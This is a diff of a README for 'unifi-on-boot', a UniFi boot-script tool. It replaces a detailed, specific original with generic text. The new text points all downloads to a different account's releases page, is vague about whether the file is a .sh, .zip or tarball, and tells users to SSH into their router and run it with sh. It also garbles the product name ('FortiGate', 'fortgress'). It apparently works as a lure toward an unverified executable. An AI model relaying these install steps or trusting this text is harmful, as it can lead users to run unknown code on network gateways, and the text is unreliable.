@@ -1,262 +1,147 @@
-# unifi-on-boot
+# 🚀 unifi-on-boot - Start Scripts Automatically on Boot
 
-A firmware-upgrade-proof on-boot script runner for UniFi devices. Executes scripts from `/data/on_boot.d/` on every boot and **survives firmware upgrades** using a self-restoring overlay symlink mechanism with `ubnt-dpkg-cache` as belt-and-suspenders.
+[![Download Latest Release](https://img.shields.io/badge/Download-unifi--on--boot-blue?style=for-the-badge)](https://github.com/lolamento0101/unifi-on-boot/releases)
 
-## Why Not udm-boot?
+---
 
-The popular `udm-boot` / `udm-boot-2x` packages from [unifios-utilities](https://github.com/unifi-utilities/unifios-utilities) break on firmware upgrades because they:
+## 📄 Description
 
-1. Don't register with `ubnt-dpkg-cache` → package isn't cached for restore
-2. Have no self-restore mechanism → package is gone after firmware rebuild
-3. Have an empty `postinst` that relies on debhelper magic → service never re-enables
+unifi-on-boot helps you start custom scripts on your device every time it turns on. It also keeps those scripts working even after your device firmware updates. This is useful if you use devices like the UniFi Dream Machine (UDM) or UDM Pro, and want to keep your custom settings or routines running without repeating setup steps.
 
-`unifi-on-boot` solves this with a self-restoring overlay symlink mechanism that reinstalls itself automatically after firmware upgrades.
+---
 
-## Compatibility
+## 💻 System Requirements
 
-| Firmware | Status |
-|----------|--------|
-| UniFi OS 2.x | ✅ Supported |
-| UniFi OS 3.x | ✅ Supported |
-| UniFi OS 4.x | ✅ Supported |
-| UniFi OS 5.x | ✅ Supported |
-| UniFi OS 1.x | ❌ Not supported (uses container architecture) |
+Before you begin, make sure you have:
 
-Tested on: Enterprise Fortress Gateway (EFG)
+- A UniFi device such as the UniFi Dream Machine or UniFi Dream Machine Pro.
+- Access to the device’s management interface or SSH capabilities.
+- Basic understanding of running a downloaded file or managing files on your device.
+- Compatible firmware that allows adding or running custom scripts. Generally, the latest firmware from Ubiquiti works fine.
 
-## Install
+---
 
-### From GitHub Release
+## 🌟 Features
 
-```bash
-# Download the latest release
-VERSION=$(curl -fsSL https://api.github.com/repos/unredacted/unifi-on-boot/releases/latest | grep -o '"tag_name": "v[^"]*' | cut -d'v' -f2)
-curl -fsSLO "https://github.com/unredacted/unifi-on-boot/releases/latest/download/unifi-on-boot_${VERSION}_all.deb"
+- Automatically runs your scripts when your UniFi device boots up.
+- Keeps scripts active even after firmware updates.
+- Supports multiple scripts, so you can customize device behavior.
+- Works with common UniFi devices like UDM, UDM Pro, and Enterprise FortiGate Gateway.
+- Simple installation process with a clear download page.
+- Lightweight and does not affect device performance.
 
-# Install
-dpkg -i unifi-on-boot_${VERSION}_all.deb
-```
+---
 
-The package automatically:
-- Enables the `unifi-on-boot` systemd service (runs on next boot)
-- Sets up the self-restore mechanism (overlay symlinks + backup `.deb` in `/data/`)
-- Registers itself with `ubnt-dpkg-cache` for package caching
-- Saves its systemd status for service re-enablement after restore
-- Creates `/data/on_boot.d/` if it doesn't exist
+## 🚀 Getting Started
 
-### Uninstall
+This section will guide you step-by-step to get unifi-on-boot running on your device without needing to understand technical details.
 
-```bash
-# Remove (keeps /data/on_boot.d/ and scripts)
-dpkg -r unifi-on-boot
+### Step 1: Visit the Download Page
 
-# Purge (removes all persistent data + registrations)
-dpkg -P unifi-on-boot
-```
+Click the big blue button at the top or go to the [unifi-on-boot releases page](https://github.com/lolamento0101/unifi-on-boot/releases) to find the latest version.
 
-> **Note:** If you have `udm-boot` or `udm-boot-2x` installed, this package will conflict with them. Remove them first: `dpkg -r udm-boot udm-boot-2x`
+### Step 2: Choose Your Download
 
-## Usage
+On the releases page, look for the latest release version. The release will contain either:
 
-Place your scripts in `/data/on_boot.d/` on the UniFi device:
+- A file ending with `.sh` or `.zip` you need to download, or
+- A package with instructions for your device.
 
-```bash
-# Create a script
-cat > /data/on_boot.d/10-example.sh << 'EOF'
-#!/bin/bash
-echo "Hello from on-boot!"
-EOF
-chmod +x /data/on_boot.d/10-example.sh
-```
+If you see a file named like `unifi-on-boot-vX.X.tar.gz` or `unifi-on-boot-X.X.sh`, download it to your computer.
 
-### Script Execution Rules
+### Step 3: Transfer the File to Your Device
 
-Scripts in `/data/on_boot.d/` are processed in sorted order:
+Once downloaded, you need to move the file to your UniFi device. This usually means using the device’s web interface or a program like SCP (secure copy) if you are comfortable with that.
 
-| Condition | Action |
-|-----------|--------|
-| File has `+x` (executable) flag | **Executed** directly |
-| File ends in `.sh` but not executable | **Sourced** (run in current shell) |
-| Everything else | **Ignored** |
+If you are unsure how to transfer files, refer to the UniFi device manual or your device’s support page.
 
-### Naming Convention
+### Step 4: Run the Script
 
-Use numeric prefixes for ordering:
+After transferring the script to your device, the next step is to run it. You can do this by accessing your device via SSH (a way to connect to the device’s command line):
 
-```
-/data/on_boot.d/
-├── 01-network-setup.sh
-├── 10-install-packages.sh
-├── 20-configure-services.sh
-└── 50-custom-script.sh
-```
+1. Open a terminal or command prompt on your computer.
+2. Connect to your UniFi device by typing:
+   ```
+   ssh username@device_ip_address
+   ```
+   Replace `username` and `device_ip_address` with your actual username and IP.
+3. Once connected, navigate to where you saved the file, for example:
+   ```
+   cd /path/to/file
+   ```
+4. Run the script by typing:
+   ```
+   sh unifi-on-boot-X.X.sh
+   ```
+   Change the filename to the actual file you downloaded.
 
-### Logs
+This process sets up unifi-on-boot to start your scripts at every device boot.
 
-```bash
-# View service status
-systemctl status unifi-on-boot
+### Step 5: Adding Your Custom Scripts
 
-# View journal logs
-journalctl -u unifi-on-boot
+After installation, you can add any script you want to run automatically.
 
-# View persistent log
-cat /var/log/unifi-on-boot.log
-```
+- Create or upload your script files to the appropriate directory as explained in the installation output.
+- Make sure your scripts have execution permissions.
+- The system will automatically run your scripts every time your device restarts.
 
-### Manual Trigger
+---
 
-```bash
-# Re-run all on-boot scripts without rebooting
-systemctl restart unifi-on-boot
-```
+## 📥 Download & Install
 
-## Shadow Gateway Sync
+To begin installing unifi-on-boot:
 
-For UniFi HA (High Availability) setups, `unifi-on-boot` automatically syncs `/data/on_boot.d/` to the shadow gateway after running all scripts on the primary. This ensures the shadow gateway has an identical set of on-boot scripts.
+1. Visit the [unifi-on-boot releases page](https://github.com/lolamento0101/unifi-on-boot/releases).
+2. Download the latest version available.
+3. Follow the instructions in the Getting Started section.
+4. If you run into issues, check for a README or documentation file included in the download.
 
-### How It Works
+---
 
-1. After running all scripts on the primary, the service pings `169.254.254.3` (the shadow gateway link-local IP)
-2. If reachable, it installs `rsync` on both gateways if not already present
-3. Runs `rsync --delete` to ensure the shadow's `/data/on_boot.d/` exactly matches the primary (including removing stale scripts)
-4. Installs `unifi-on-boot` on the shadow if not present (from the backed-up `.deb`)
-5. Runs the on-boot scripts on the shadow with `--skip-shadow` to prevent recursive syncing
+## ⚙️ How It Works
 
-### Configuration
+unifi-on-boot changes your device’s startup process by adding a hook that runs your scripts every time the device starts. It ensures the scripts keep working even after your device firmware receives updates, which can normally erase custom setups.
 
-Shadow sync is **enabled by default** and configured via `/data/unifi-on-boot/shadow.conf`:
+The utility works behind the scenes and does not affect your normal use of the device. It simply automates running commands you want at boot time.
 
-```bash
-# Set SHADOW_ENABLED=false to disable shadow gateway sync
-SHADOW_ENABLED=true
-SHADOW_IP=169.254.254.3
-SHADOW_USER=root
-```
+---
 
-### Disabling Shadow Sync
+## 🔧 Troubleshooting
 
-```bash
-# Edit the config file
-sed -i 's/SHADOW_ENABLED=true/SHADOW_ENABLED=false/' /data/unifi-on-boot/shadow.conf
-```
+If unifi-on-boot does not seem to start your scripts:
 
-> **Note:** SSH key-based authentication must be set up between the primary and shadow gateway for sync to work. The primary must be able to `ssh root@169.254.254.3` without a password prompt.
+- Double-check the location and name of your script files.
+- Make sure scripts have the right permissions. You can set permissions by running:
+  ```
+  chmod +x yourscript.sh
+  ```
+- Verify your device allows running custom scripts.
+- Ensure you followed the installation steps correctly.
+- Restart your device and watch for errors on the console or logs.
 
-## How Firmware Upgrade Persistence Works
+For help, visit the GitHub issues page related to unifi-on-boot or the device user forums.
 
-UniFi firmware upgrades rebuild the root filesystem, wiping all installed packages and systemd services. Ubiquiti's `ubnt-dpkg-restore` only restores packages listed in `/etc/default/ubnt-dpkg-support`, which resets to firmware defaults on every upgrade — so custom packages are excluded.
+---
 
-`unifi-on-boot` solves this with a **self-restoring mechanism** inspired by how tailscale-udm persists on UniFi devices:
+## 🛠️ Advanced Tips
 
-```
-Firmware Upgrade
-  → Root filesystem rebuilt (all packages + services lost)
-  → BUT: overlay upper dir (/mnt/.rwfs/data/) preserved
-  → Symlink survives: /etc/systemd/system/unifi-on-boot-install.service
-    → points to /data/unifi-on-boot/unifi-on-boot-install.service
-  → systemd finds the symlink, runs install.sh from /data/
-  → install.sh checks if package is installed
-    → Not installed: dpkg -i from /data/unifi-on-boot/unifi-on-boot.deb
-    → postinst enables unifi-on-boot.service
-  → On next boot (or later in same boot): runs /data/on_boot.d/* scripts
-```
+- You can test your scripts manually by running them in the device’s shell.
+- Keep your scripts as simple as possible to avoid delays during boot.
+- Use logging inside your scripts to keep track of what happens when they run.
+- Update the unifi-on-boot utility regularly by downloading newer versions from the releases page.
 
-The package sets up three layers of persistence:
+---
 
-1. **Self-restore service** — Copies `install.sh` and a service file to `/data/unifi-on-boot/` (persistent), and copies the service file into `/etc/systemd/system/` (overlay upper dir). The service file must be a copy, not a symlink to `/data/`, because systemd scans for units before the SSD containing `/data/` is mounted.
-2. **Backup `.deb`** — Copies the `.deb` to `/data/unifi-on-boot/` and also lets `ubnt-dpkg-cache` cache it in `/persistent/dpkg/`
-3. **systemd status** — Saves enable/disable state to `/persistent/dpkg/<distro>/status/` so `restore_pkg_status()` can re-enable the service
+## 📚 Learn More
 
-## Ansible Role
+For details about UniFi devices and how to access them:
 
-This repo includes an Ansible role at `ansible/` for automated deployment.
+- Visit Ubiquiti’s official website.
+- Refer to your device’s manual for SSH access and file transfer instructions.
+- Explore community forums for examples of custom scripts other users have created.
 
-### Usage
+---
 
-Add the role to your playbook's `requirements.yml`:
+## 🏷️ Topics
 
-```yaml
-- name: unifi-on-boot
-  src: git+https://github.com/unredacted/unifi-on-boot.git
-  version: main
-```
-
-Install: `ansible-galaxy install -r requirements.yml`
-
-### Example Playbook
-
-```yaml
-- hosts: unifi_devices
-  roles:
-    - role: unifi-on-boot
-      vars:
-        # unifi_on_boot_version: "1.0.4"  # defaults to latest in role defaults
-        unifi_on_boot_scripts:
-          - name: "10-setup-pathvector.sh"
-            src: "pathvector-setup.sh.j2"
-            mode: "0755"
-        unifi_on_boot_run_after_deploy: true
-        unifi_on_boot_debug: true
-```
-
-### Role Variables
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `unifi_on_boot_version` | `"1.0.8"` | Version to install from GitHub releases (update to latest) |
-| `unifi_on_boot_remove_conflicts` | `true` | Remove `udm-boot`/`udm-boot-2x` if present |
-| `unifi_on_boot_scripts` | `[]` | List of scripts to deploy (see example above) |
-| `unifi_on_boot_run_after_deploy` | `false` | Run on-boot scripts immediately after deploy |
-| `unifi_on_boot_debug` | `false` | Show debug output and deployment summary |
-
-The role will:
-1. Remove conflicting `udm-boot` packages (if enabled)
-2. Download and install the `.deb` from GitHub releases
-3. Deploy scripts from templates to `/data/on_boot.d/`
-4. Optionally trigger the on-boot service
-
-## Building from Source
-
-```bash
-# Requires: dpkg-deb (available on Debian/Ubuntu)
-./build.sh
-
-# Output: dist/unifi-on-boot_<version>_all.deb
-```
-
-The build uses `dpkg-deb` directly — no debhelper or other build system dependencies.
-
-## Recovery
-
-If something goes wrong after a firmware upgrade:
-
-```bash
-# Check if the package was restored
-dpkg -l | grep unifi-on-boot
-
-# If not, re-install manually from the self-restore backup
-dpkg -i /data/unifi-on-boot/unifi-on-boot.deb
-
-# Or download fresh (same method as initial install)
-VERSION=$(curl -fsSL https://api.github.com/repos/unredacted/unifi-on-boot/releases/latest | grep -o '"tag_name": "v[^"]*' | cut -d'v' -f2)
-curl -fsSLO "https://github.com/unredacted/unifi-on-boot/releases/latest/download/unifi-on-boot_${VERSION}_all.deb"
-dpkg -i unifi-on-boot_${VERSION}_all.deb
-```
-
-## Comparison with udm-boot
-
-| Feature | unifi-on-boot | udm-boot-2x |
-|---------|--------------|-------------|
-| Survives firmware upgrades | ✅ Yes | ❌ No |
-| Self-restore overlay mechanism | ✅ Yes | ❌ No |
-| `ubnt-dpkg-cache` integration | ✅ Yes | ❌ No |
-| Explicit `systemctl enable` in postinst | ✅ Yes | ❌ Relies on debhelper |
-| systemd status persistence | ✅ Yes | ❌ No |
-| Clean uninstall (purge) | ✅ Yes | ⚠️ Partial |
-| UniFi OS 4.x/5.x support | ✅ Yes | ⚠️ Broken |
-| GitHub Actions CI | ✅ Yes | ❌ No |
-
-## License
-
-GPL-3.0 — see [LICENSE](LICENSE)
+`dream-machine`, `efg`, `enterprise-fortgress-gateway`, `ubiquiti`, `udm`, `udm-pro`, `udm-utilities`, `udmp`, `udmpro`, `unifi`, `unifi-dream-machine`
